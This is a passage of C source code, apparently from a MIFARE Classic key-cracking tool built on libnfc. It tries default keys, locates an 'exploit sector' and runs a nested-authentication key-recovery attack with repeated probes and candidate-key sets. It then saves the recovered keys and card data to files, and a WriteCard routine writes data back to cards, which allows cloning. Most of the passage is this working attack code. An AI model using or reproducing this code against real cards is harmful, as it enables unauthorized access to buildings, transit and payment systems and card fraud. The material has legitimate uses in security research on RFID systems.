			sprintf(fileName, "%s/keys/b%08x.dump", keyDir, t.uid);
			if (!skipB && (keyFileB = fopen(fileName, "rb"))) {
				foundBFile = true;
				UpdateStatusMessage("B-key file found.");
				if (t.num_sectors == fread(keyBuffer, 6, t.num_sectors, keyFileB)) {
					int keyPlace;
					for (keyPlace = 0;keyPlace<t.num_sectors;keyPlace++) {
						t.sectors[keyPlace].foundKeyB = true;
						memcpy(t.sectors[keyPlace].KeyB, keyBuffer[keyPlace],6);
						UpdateSectorStatus('B', keyPlace, 2);
					}
				}
				fclose(keyFileB);
			} else if (!skipB) {
				UpdateStatusMessage("Didn't find B-key file. Start cracking keys.\n");
			} else {
				foundBFile = true;;
			}
		}

		keysFound = foundAFile && foundBFile;
		if (!keysFound) {
			sprintf(StatusBuffer, "%s/keys", keyDir);
			mkdir(StatusBuffer);
			ReadCurrentKeys(keyDir, skipA ? true : foundAFile, skipB ? true : foundBFile, t, UpdateSectorStatus);

			// Try to authenticate to all sectors with default keys
			// Set the authentication information (uid)
			memcpy(mp.mpa.abtUid, t.ti.nai.abtUid, sizeof(mp.mpa.abtUid));
			// Iterate over all keys (n = number of keys)
			n = sizeof(defaultKeys)/sizeof(defaultKeys[0]);
		
			for (key = 0; key < n; key++) {
				if (0 == key && NULL == defKey) ++key; // Custom key not provided, try another key
				memcpy(mp.mpa.abtKey, defaultKeys[key], sizeof(mp.mpa.abtKey));
				sprintf(StatusBuffer,"status: [Key: %012llx]", bytes_to_num(mp.mpa.abtKey, 6));
				UpdateStatusMessage(StatusBuffer);
			
				if (3 == key && 40 == t.num_sectors)
					if (iFoundKeys == ((!skipA && !skipB) ? 44 : 22))
						break;

				i = 0; // Sector counter

				// Iterate over every block, where we haven't found a key yet
				for (block = 0; block <= t.num_blocks; ++block) {
					if (trailer_block(block)) {
					bool found_key = false;
					if (!t.sectors[i].foundKeyA&&!skipA) {
						mc = MC_AUTH_A;
						UpdateSectorStatus('A', i, 1);
						if (!nfc_initiator_mifare_cmd(r.pdi,mc,block,&mp)) {
							// fprintf(stdout, "!!Error: AUTH [Key A:%012llx] sector %02x t_block %02x\n", 
							// 	bytes_to_num(mp.mpa.abtKey, 6), i, block);
							UpdateSectorStatus('A', i, 0);
							mf_anticollision(device, &t, &r, UpdateStatusMessage);
							if (stopreadingcard) { nfc_disconnect(r.pdi); free(t.sectors); free(d.distances); return 0;	}
						} else {
							// Save all information about successfull keyA authentization
							memcpy(t.sectors[i].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
							t.sectors[i].foundKeyA = true;
							found_key = true;

							iFoundKeys++;
							UpdateSectorStatus('A', i, 2);
							WriteCurrentKeys(keyDir, skipA, skipB, t);
						}
					}
					if (!t.sectors[i].foundKeyB&&!skipB) {
						mc = MC_AUTH_B;
						UpdateSectorStatus('B', i, 1);
						if (!nfc_initiator_mifare_cmd(r.pdi,mc,block,&mp)) {
							mf_anticollision(device, &t, &r, UpdateStatusMessage);
							if (stopreadingcard) { nfc_disconnect(r.pdi);free(t.sectors); free(d.distances); return 0;	}
							// No success, try next block
							UpdateSectorStatus('B', i, 0);
							t.sectors[i].trailer = block;
						} else {
							memcpy(t.sectors[i].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
							t.sectors[i].foundKeyB = true;
							found_key = true;
							iFoundKeys++;
							UpdateSectorStatus('B', i, 2);
							WriteCurrentKeys(keyDir, skipA, skipB, t);
						}
					}

					fflush(stdout);

					t.sectors[i++].trailer = block;
					
					}
				}
			}

			mf_configure(r.pdi);
			mf_anticollision(device, &t, &r, UpdateStatusMessage);
			if (stopreadingcard) { free(t.sectors); free(d.distances); return 0;	}
			// Return the first (exploit) sector encrypted with the default key or -1 (we have all keys)
			e_sector = find_exploit_sector(t, UpdateStatusMessage);
			if (stopreadingcard) { free(t.sectors); free(d.distances); return 0;	}
			//mf_enhanced_auth(e_sector, 0, t, r, &d, pk, 'd'); // AUTH + Get Distances mode
		
			// Recover key from encrypted sectors, j is a sector counter
			for (m = (skipA?1:0); m < (skipB?1:2) && !stopreadingcard; ++m) {
				if (-1 == e_sector) break; // All keys are default, I am skipping recovery mode
				dumpKeysA = m == 0;
				for (j = 0; j < (t.num_sectors); ++j) {
					performance pSector;
					pSector.duration = GetTickCount();
					memcpy(mp.mpa.abtUid, t.ti.nai.abtUid, sizeof(mp.mpa.abtUid));
					if ((dumpKeysA && !t.sectors[j].foundKeyA) || (!dumpKeysA && !t.sectors[j].foundKeyB)) {
						UpdateSectorStatus(dumpKeysA ? 'A' : 'B', j, 1);
						// First, try already broken keys
						skip = false;
						for (o = 0; o < bk->size && !stopreadingcard; o++) {
							num_to_bytes(bk->brokenKeys[o], 6, mp.mpa.abtKey);
							mc = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
							if (!nfc_initiator_mifare_cmd(r.pdi,mc,t.sectors[j].trailer,&mp)) {
								mf_anticollision(device, &t, &r, UpdateStatusMessage);
								if (stopreadingcard) { free(t.sectors); free(d.distances); return 0;	}
							} else {
								// Save all information about successfull authentization
								if (dumpKeysA) {
									memcpy(t.sectors[j].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
									UpdateSectorStatus('A', j, 2);
									t.sectors[j].foundKeyA = true;
									WriteCurrentKeys(keyDir, skipA, skipB, t);
								} else if(!skipB){
									memcpy(t.sectors[j].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
									UpdateSectorStatus('B', j, 2);
									t.sectors[j].foundKeyB = true;
									WriteCurrentKeys(keyDir, skipA, skipB, t);
								}

								sprintf(StatusBuffer,"Sector: %d, type %c, key [%012llx]", j, (dumpKeysA ? 'A' : 'B'), bytes_to_num(mp.mpa.abtKey, 6));
								UpdateStatusMessage(StatusBuffer);

								mf_configure(r.pdi);
								mf_anticollision(device, &t, &r, UpdateStatusMessage);
								if (stopreadingcard) { free(t.sectors); free(d.distances); return 0;	}
								skip = true;
								break;
							}
						}
						if (skip) continue; // We have already revealed key, go to the next iteration
				
						// Max probes for auth for each sector
						for (k = 0; k < probes && !stopreadingcard; ++k) {
							performance pProbe;
							pProbe.duration = GetTickCount();
							// Try to authenticate to exploit sector and determine distances (filling denonce.distances)
						
							mf_enhanced_auth(e_sector, 0, t, r, &d, pk, 'd', dumpKeysA, UpdateStatusMessage); // AUTH + Get Distances mode
							if (stopreadingcard) { free(t.sectors); free(d.distances); return 0;	}
							sprintf(StatusBuffer,"Sector: %d, type %c, probe %d, distance %d", j, (dumpKeysA ? 'A' : 'B'), k, d.median);
							UpdateStatusMessage(StatusBuffer);

							// Configure device to the previous state 
							mf_configure(r.pdi);
							mf_anticollision(device, &t, &r, UpdateStatusMessage);
							if (stopreadingcard) { free(t.sectors); free(d.distances); return 0;	}
			
							pk->possibleKeys = NULL;
							pk->size = 0;
							// We have 'sets' * 32b keystream of potential keys
							for (n = 0; n < sets; n++) {
								performance pSet;
								pSet.duration = GetTickCount();
								sprintf(StatusBuffer,"Sector: %d, type %c, probe %d, distance %d, set %d", j, (dumpKeysA ? 'A' : 'B'), k, d.median, (n + 1));
								UpdateStatusMessage(StatusBuffer);

								// AUTH + Recovery key mode (for a_sector), repeat 5 times
								mf_enhanced_auth(e_sector, t.sectors[j].trailer, t, r, &d, pk, 'r', dumpKeysA, UpdateStatusMessage);
								if (stopreadingcard) { free(t.sectors); free(d.distances); return 0;	}
								mf_configure(r.pdi);
								mf_anticollision(device, &t, &r, UpdateStatusMessage);
								if (stopreadingcard) { free(t.sectors); free(d.distances); return 0;	}

								pSet.duration = GetTickCount() - pSet.duration;
								pSet.keyType = dumpKeysA ? 'A' : 'B';
								pSet.sector = j;
								pSet.probe = k;
								pSet.set = n;
								performanceData->push_back(pSet);
							}
							// Get first 15 grouped keys
							ck = uniqsort(pk->possibleKeys, pk->size, UpdateStatusMessage);
							if (stopreadingcard) { free(t.sectors); free(d.distances); return 0;	}
							sprintf(StatusBuffer,"Possible Keys: %d", pk->size);
							UpdateStatusMessage(StatusBuffer);
							tryKeys = pk->size > TRY_KEYS ? TRY_KEYS : pk->size;
							for (i = 0; i < tryKeys && !stopreadingcard ; i++) {
								// We don't known this key, try to break it
								// This key can be found here two or more times
								if (ck[i].count > 0) {
									sprintf(StatusBuffer,"Possible Key: %llx", ck[i].key);
									UpdateStatusMessage(StatusBuffer);

									// Set required authetication method
									num_to_bytes(ck[i].key, 6, mp.mpa.abtKey); 
									mc = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
									if (!nfc_initiator_mifare_cmd(r.pdi,mc,t.sectors[j].trailer,&mp)) {
										mf_anticollision(device, &t, &r, UpdateStatusMessage);
										if (stopreadingcard) { free(pk->possibleKeys); free(ck); free(t.sectors); free(d.distances); return 0;	}
									} else {
										// Save all information about successfull authentization
										bk->size++;
										bk->brokenKeys = (uint64_t *) realloc((void *)bk->brokenKeys, bk->size * sizeof(uint64_t));
										bk->brokenKeys[bk->size-1] = bytes_to_num(mp.mpa.abtKey, 6);
										if (dumpKeysA) {
											memcpy(t.sectors[j].KeyA, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
											t.sectors[j].foundKeyA = true;
											UpdateSectorStatus('A', j, 2);
											WriteCurrentKeys(keyDir, skipA, skipB, t);
										} else {
											memcpy(t.sectors[j].KeyB, mp.mpa.abtKey, sizeof(mp.mpa.abtKey));
											t.sectors[j].foundKeyB = true;
											UpdateSectorStatus('B', j, 2);
											WriteCurrentKeys(keyDir, skipA, skipB, t);
										}

										sprintf(StatusBuffer, "Found Key: %c [%012llx]\n", (dumpKeysA ? 'A' : 'B'), bytes_to_num(mp.mpa.abtKey, 6));
										UpdateStatusMessage(StatusBuffer);

										mf_configure(r.pdi);
										mf_anticollision(device, &t, &r, UpdateStatusMessage);
										if (stopreadingcard) { free(pk->possibleKeys); free(ck); free(t.sectors); free(d.distances); return 0;	}
										break;
									}
								}
							}
							free(pk->possibleKeys);
							free(ck);
							pProbe.duration = GetTickCount() - pProbe.duration;
							pProbe.keyType = dumpKeysA ? 'A' : 'B';
							pProbe.sector = j;
							pProbe.probe = k;
							pProbe.set = -1;
							performanceData->push_back(pProbe);
							// Success, try the next sector
							if ((dumpKeysA && t.sectors[j].foundKeyA) || (!dumpKeysA && t.sectors[j].foundKeyB)) break;
						}
						// We haven't found any key, exiting
						if ((dumpKeysA && !t.sectors[j].foundKeyA) || (!dumpKeysA && !t.sectors[j].foundKeyB)) { 
							UpdateStatusMessage("No success, maybe you should increase the probes.");
							return 0;
						}
					}
					pSector.duration = GetTickCount() - pSector.duration;
					pSector.keyType = dumpKeysA ? 'A' : 'B';
					pSector.sector = j;
					pSector.probe = -1;
					pSector.set = -1;
					performanceData->push_back(pSector);
				}
			
			}
		}
		
		
		for (i = 0; i < (t.num_sectors); ++i) {
			if ((!skipA&&(dumpKeysA && !t.sectors[i].foundKeyA)) || (!skipB&&(!dumpKeysA && !t.sectors[i].foundKeyB))) {
				UpdateStatusMessage("Try again, there are still some encrypted blocks.");
				succeed = 0;
				break;
			}
		}

		if (succeed) {
			i = t.num_sectors; // Sector counter
			UpdateStatusMessage("Auth with all sectors succeeded, dumping keys to a file!");
			// Read all blocks
			uint8_t sec;
			mifare_sector mfs;
			mfs.sector = 0;
			memcpy(skipA ? mfs.KeyB : mfs.KeyA, skipA ? t.sectors[0].KeyB : t.sectors[0].KeyA, sizeof(t.sectors[0].KeyA));
			readSector(device, r.pdi, &mfs, &t.ti,false, &t, &r, UpdateStatusMessage);
			memcpy(&mtDump.amb[sectorToFirstBlock(mfs.sector)],mfs.Data,numberOfBlocks(mfs.sector)*16);
			memcpy(mtDump.amb[sectorToFirstBlock(0)+numberOfBlocks(0)-1].mbt.abtKeyA, t.sectors[0].KeyA,6);
			memcpy(mtDump.amb[sectorToFirstBlock(0)+numberOfBlocks(0)-1].mbt.abtKeyB, t.sectors[0].KeyB,6);

			memset(mfs.Data, 0, sizeof(mfs.Data));
			for (sec = skipToSector;sec<i;sec++) {
				mfs.sector = sec;
				memcpy(skipA ? mfs.KeyB : mfs.KeyA, skipA ? t.sectors[sec].KeyB : t.sectors[sec].KeyA, sizeof(t.sectors[sec].KeyA));
				readSector(device, r.pdi, &mfs, &t.ti,false, &t, &r, UpdateStatusMessage);
				memcpy(&mtDump.amb[sectorToFirstBlock(sec)],mfs.Data,numberOfBlocks(mfs.sector)*16);
				memcpy(mtDump.amb[sectorToFirstBlock(sec)+numberOfBlocks(sec)-1].mbt.abtKeyA, t.sectors[sec].KeyA,6);
				memcpy(mtDump.amb[sectorToFirstBlock(sec)+numberOfBlocks(sec)-1].mbt.abtKeyB, t.sectors[sec].KeyB,6);

				memcpy(mp.mpa.abtUid,t.ti.nai.abtUid,4);
			}

			// Finally save all keys + data to file
			if (useKeyFile) {
				sprintf(StatusBuffer, "%s/keys", keyDir);
				mkdir(StatusBuffer);
				if (!keysFound) {
					int keyPlace;
					if (!skipA) {
						sprintf(StatusBuffer, "keys/a%08x.dump", t.uid);
						UpdateStatusMessage(StatusBuffer);

						sprintf(fileName, "%s/keys/a%08x.dump", keyDir, t.uid);
						if (keyFileA = fopen(fileName, "wb")) {
							for (keyPlace = 0;keyPlace<t.num_sectors;keyPlace++)
								memcpy(keyBuffer[keyPlace], t.sectors[keyPlace].KeyA,6);
						
							fwrite(keyBuffer, 6, t.num_sectors,keyFileA);
							fclose(keyFileA);
						} else {
							sprintf(StatusBuffer, "Error: Failed opening A-key file (%s) for writing", fileName);
							UpdateStatusMessage(StatusBuffer);
						}
					}
					if (!skipB) {
						sprintf(fileName, "%s/keys/b%08x.dump", keyDir, t.uid);

						sprintf(StatusBuffer, "keys/b%08x.dump", t.uid);
						UpdateStatusMessage(StatusBuffer);


						if (keyFileB = fopen(fileName, "wb")) {
							for(keyPlace = 0;keyPlace<t.num_sectors;keyPlace++)
								memcpy(keyBuffer[keyPlace], t.sectors[keyPlace].KeyB, 6);
						
							fwrite(keyBuffer, 6, t.num_sectors,keyFileB);
							fclose(keyFileB);
						} else {
							sprintf(StatusBuffer, "Error: Failed opening B-key file (%s) for writing", fileName);
							UpdateStatusMessage(StatusBuffer);
						}
					}
				}
				
			}
		}
		DeleteTempKeys(keyDir, skipA, skipB, t);
		free(t.sectors);
		free(d.distances);
	
		// Reset the "advanced" configuration to normal
		nfc_configure(r.pdi, NDO_HANDLE_CRC, true);
		nfc_configure(r.pdi, NDO_HANDLE_PARITY, true);

		// Disconnect device and exit
		nfc_disconnect(r.pdi);
		memcpy(buffer, &mtDump, buffersize < 4096 ? 1024 : 4096);
		UpdateStatusMessage("Done!");
		return t.b4K ? 4096 : 1024;
	}
	else if (t.ti.nai.abtAtqa[1] == 0x44) {
		if (buffersize < 64) {
			UpdateStatusMessage("Buffersize must be at least 64 bytes");
			return 0;
		}
		byte_t *pbtUID;
		pbtUID = t.ti.nai.abtUid;
		sprintf (StatusBuffer, "Card: MIFARE Ultralight card with UID: %02x%02x%02x%02x\n", pbtUID[3], pbtUID[2], pbtUID[1], pbtUID[0]);
		UpdateStatusMessage(StatusBuffer);
		mifareul_tag mfult;
		read_mifare_ul_card(r.pdi, &mfult, UpdateStatusMessage);

		// Reset the "advanced" configuration to normal
		nfc_configure(r.pdi, NDO_HANDLE_CRC, true);
		nfc_configure(r.pdi, NDO_HANDLE_PARITY, true);

		// Disconnect device and exit
		nfc_disconnect(r.pdi);

		return 64;
	}
	else {
		UpdateStatusMessage("Unsupported card inserted, please insert an MiFare Classic or an MiFare ultralight card!");
		return 0;
	}
}

bool Authenticate(nfc_device_t * pnd, mifare_sector* sector, nfc_target_info_t *t, bool keyA, bool keyB) {
	static mifare_param mp;
	uint8_t block = sectorToFirstBlock(sector->sector)+numberOfBlocks(sector->sector)-1;
	bool auth = false;
	memcpy(mp.mpa.abtUid,t->nai.abtUid,4);

	if (keyB) {
		memcpy(mp.mpa.abtKey,sector->KeyB, sizeof(sector->KeyB));
		if (nfc_initiator_mifare_cmd(pnd, MC_AUTH_B, block, &mp)) {
			auth = true;
		}
	}

	if (!auth && keyA) {
		memcpy(mp.mpa.abtKey,sector->KeyA, sizeof(sector->KeyA));
		if (nfc_initiator_mifare_cmd(pnd, MC_AUTH_A, block, &mp)) {
			auth = true;
		}
	}
	return auth;
}

void writeSector(nfc_device_t * pnd, mifare_sector* sector,nfc_target_info_t *t, bool keyA, bool keyB, bool writeKeys, void (*UpdateStatusMessage)(char *status)) {
	static mifare_param mp;
	char Buffer[150];
	uint8_t block = sectorToFirstBlock(sector->sector)+numberOfBlocks(sector->sector)-1;
	memcpy(mp.mpa.abtKey,sector->KeyB, sizeof(sector->KeyB));
	memcpy(mp.mpa.abtUid,t->nai.abtUid,4);
	if (Authenticate(pnd, sector, t, keyA, keyB)) {
		int i;
		for (i=numberOfBlocks(sector->sector)-1;i>=0;i--) {
			if (trailer_block(block) && !writeKeys) {
			} else {
				memcpy(mp.mpd.abtData, sector->Data[i], 16);
				if (nfc_initiator_mifare_cmd(pnd, MC_WRITE, block, &mp)) {
					sprintf(Buffer, "Block %02d, type %c, key %012llx :", block, 'B', bytes_to_num(sector->KeyB, 6));
					UpdateStatusMessage(Buffer);
				} else {
					mf_configure(pnd);
					nfc_initiator_select_passive_target(pnd, NM_ISO14443A_106, NULL, 0, t);
					sprintf(Buffer, "Error Writing: Block %02d, type %c, key %012llx", block, 'B', bytes_to_num(sector->KeyB, 6));
					UpdateStatusMessage(Buffer);
					break;
				}
			}
			block--;
		}
	} else {
		sprintf(Buffer, "Error Writing: Block %02d, type %c, key %012llx :", block, 'B', bytes_to_num(sector->KeyB, 6));
		UpdateStatusMessage(Buffer);
		mf_configure(pnd);
		nfc_initiator_select_passive_target(pnd, NM_ISO14443A_106, NULL, 0, t);
	}
}

int WriteCard(nfc_device_desc_t *device, char *keyDir, unsigned char *buffer, int buffersize, bool keyA, bool keyB, bool writeKeys, void (*UpdateSectorStatus)(char, int, byte_t), void (*UpdateStatusMessage)(char *status), void (*SetCardInfo)(char *status)) {

	//Set all sectors to no information
	char StatusBuffer[600];
	int ch, k, n;
	int iFoundKeys = 0;
	unsigned int i, j, m, o;
	int key, block;
	int succeed = 1;
	char *data;

	// Exploit sector
	int e_sector; 
	int probes = DEFAULT_PROBES_NR;
	int tryKeys = 0;
		
	// By default, dump 'A' keys
	bool dumpKeysA = true;
	bool skip = false;
	bool keysFound = false;
	bool skipB = !keyB;
	bool skipA = !keyA;
	bool useKeyFile = true;
	bool foundAFile = false;
	bool foundBFile = false;
	
	stopreadingcard = false;

	char fileName[1000];
	FILE * keyFileA;
	FILE * keyFileB;
	byte_t keyBuffer[40][6];
	
	// Next default key specified as option (-k)
	byte_t * defKey = NULL; 
	
	// Array with default Mifare Classic keys
	byte_t defaultKeys[][6] = {
	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // User defined key slot
	//{0x, 0x, 0x, 0x, 0x, 0x},

	{0xb5, 0xff, 0x67, 0xcb, 0xa9, 0x51},
	{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},

	{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
	{0xa0, 0xa1, 0xa2, 0xa3, 0xa4, 0xa5},
	{0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5},
	{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
	{0x4d, 0x3a, 0x99, 0xc3, 0x51, 0xdd},
	{0x1a, 0x98, 0x2c, 0x7e, 0x45, 0x9a},
	{0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff}

	};
	
	mftag		t;
	mfreader	r;
	denonce		d = {NULL, 0, DEFAULT_DIST_NR, DEFAULT_TOLERANCE, {0x00, 0x00, 0x00}};

	// Pointers to possible keys
	pKeys		*pk;
	countKeys	*ck;
	
	// Pointer to already broken keys, except defaults
	bKeys		*bk;
	
	static mifare_param mp;
	static mifare_classic_tag mtDump;
	
	mifare_cmd mc;

	i=1;

	for (i = 0; i < 40; i++) {
		UpdateSectorStatus('A', i, 0);
		UpdateSectorStatus('B', i, 0);
	}

	
	// Initialize reader/tag structures
	mf_init(device, &t, &r, UpdateStatusMessage);
	if (stopreadingcard) return 0;
	// Configure reader settings
	mf_configure(r.pdi);
	if (stopreadingcard) return 0;
	mf_select_tag(r.pdi, &t.ti, UpdateStatusMessage);
	if (stopreadingcard) return 0;
	//Check if it's a mifare classic tag
	if (0 != (t.ti.nai.btSak & 0x08)) {

		// Save tag uid and info about block size (b4K)
		t.b4K = (t.ti.nai.abtAtqa[1] == 0x02);
		t.uid = (uint32_t) bytes_to_num(t.ti.nai.abtUid, 4);

		t.num_blocks = (t.b4K) ? 0xff : 0x3f;
		t.num_sectors = t.b4K ? NR_TRAILERS_4k : NR_TRAILERS_1k;
	
		t.sectors = (sector *) calloc(t.num_sectors, sizeof(sector));

		if (t.b4K && buffersize < 4096) {
			UpdateStatusMessage("Buffersize must be at least 4096 bytes");
			return 0;
		}
		else if (t.b4K && buffersize < 1024) {
			UpdateStatusMessage("Buffersize must be at least 1024 bytes");
			return 0;
		}


		if (NULL == t.sectors) {
			UpdateStatusMessage("Status: Error! Cannot allocate memory for t.sectors."); 
			return 0;
		}

		if (NULL == (pk = (pKeys *) malloc(sizeof(pKeys)))) {
			UpdateStatusMessage("Status: Error! Cannot allocate memory for pk."); 
			return 0;
		}

		if (NULL == (bk = (bKeys *) malloc(sizeof(bKeys)))) {
			UpdateStatusMessage("Status: Error! Cannot allocate memory for bk."); 
			return 0;
		} else { 
			bk->brokenKeys = NULL;
			bk->size = 0; 
		}
		
		d.distances = (uint32_t *) calloc(d.num_distances, sizeof(u_int32_t));
		if (NULL == d.distances) {
			UpdateStatusMessage("Status: Error! Cannot allocate memory for t.distances."); 
			return 0;
		}		
	
	
		// Initialize t.sectors, keys are not known yet
		for (i = 0; i < (t.num_sectors); ++i) {
			t.sectors[i].foundKeyA = t.sectors[i].foundKeyB = false;
		}
	
		sprintf(StatusBuffer,"Card: MIFARE Classic %cK card with uid: %08x\n", (t.b4K ? '4' : '1'), t.uid);
		SetCardInfo(StatusBuffer);

		if (useKeyFile) {
			sprintf(fileName, "%s/keys/a%08x.dump", keyDir, t.uid);
			if ((!skipA) && (keyFileA = fopen(fileName, "rb"))) {
				foundAFile = true;
				UpdateStatusMessage("A-key file found.");
				if (t.num_sectors == fread(keyBuffer, 6, t.num_sectors, keyFileA)) {
					int keyPlace;
					for (keyPlace = 0;keyPlace<t.num_sectors;keyPlace++) {
						t.sectors[keyPlace].foundKeyA = true;
						memcpy(t.sectors[keyPlace].KeyA, keyBuffer[keyPlace],6);
						UpdateSectorStatus('A', keyPlace, 2);
					}
				}
				fclose(keyFileA);
			} else if (!skipA) {
				UpdateStatusMessage("Didn't find A-key file. Start cracking keys.\n");
			} else {
				foundAFile = true;;
			}

			sprintf(fileName, "%s/keys/b%08x.dump", keyDir, t.uid);
			if (!skipB && (keyFileB = fopen(fileName, "rb"))) {
				foundBFile = true;
				UpdateStatusMessage("B-key file found.");
				if (t.num_sectors == fread(keyBuffer, 6, t.num_sectors, keyFileB)) {
					int keyPlace;
					for (keyPlace = 0;keyPlace<t.num_sectors;keyPlace++) {
						t.sectors[keyPlace].foundKeyB = true;
						memcpy(t.sectors[keyPlace].KeyB, keyBuffer[keyPlace],6);
						UpdateSectorStatus('B', keyPlace, 2);
					}
				}
				fclose(keyFileB);
			} else if (!skipB) {
				UpdateStatusMessage("Didn't find B-key file. Start cracking keys.\n");
			} else {
				foundBFile = true;;
			}
		}

		keysFound = foundAFile && foundBFile;
		
		for (i = 0; i < (t.num_sectors); ++i) {
			if ((!skipA&&(dumpKeysA && !t.sectors[i].foundKeyA)) || (!skipB&&(!dumpKeysA && !t.sectors[i].foundKeyB))) {
				UpdateStatusMessage("Try again, there are still some encrypted blocks.");
				succeed = 0;
				break;
			}
		}

		if (succeed) {
			i = t.num_sectors; // Sector counter
			UpdateStatusMessage("Auth with all sectors succeeded, dumping keys to a file!");
			// Read all blocks
			uint8_t sec;
			mifare_sector mfs;
			mfs.sector = 0;
			memcpy(mfs.KeyA, t.sectors[0].KeyA, sizeof(t.sectors[0].KeyA));
			memset(mfs.Data, 0, sizeof(mfs.Data));

			for (sec = 0;sec<i;sec++) {
				mfs.sector = sec;
				memcpy(mfs.KeyA, t.sectors[sec].KeyA, sizeof(t.sectors[sec].KeyA));
				memcpy(mfs.KeyB, t.sectors[sec].KeyB, sizeof(t.sectors[sec].KeyB));

				memcpy(mfs.Data, &buffer[sectorToFirstBlock(sec) * 0x10], numberOfBlocks(sec) * 0x10);
				writeSector(r.pdi, &mfs, &t.ti, keyA, keyB, writeKeys, UpdateStatusMessage);
			}
		}
		free(t.sectors);
		free(d.distances);
	
		// Reset the "advanced" configuration to normal
		nfc_configure(r.pdi, NDO_HANDLE_CRC, true);
		nfc_configure(r.pdi, NDO_HANDLE_PARITY, true);

		// Disconnect device and exit
		nfc_disconnect(r.pdi);
		memcpy(buffer, &mtDump, buffersize < 4096 ? 1024 : 4096);
		UpdateStatusMessage("Done!");
		return t.b4K ? 4096 : 1024;
	}
	else {
		UpdateStatusMessage("Unsupported card inserted, please insert an MiFare Classic card!");
		return 0;
	}

}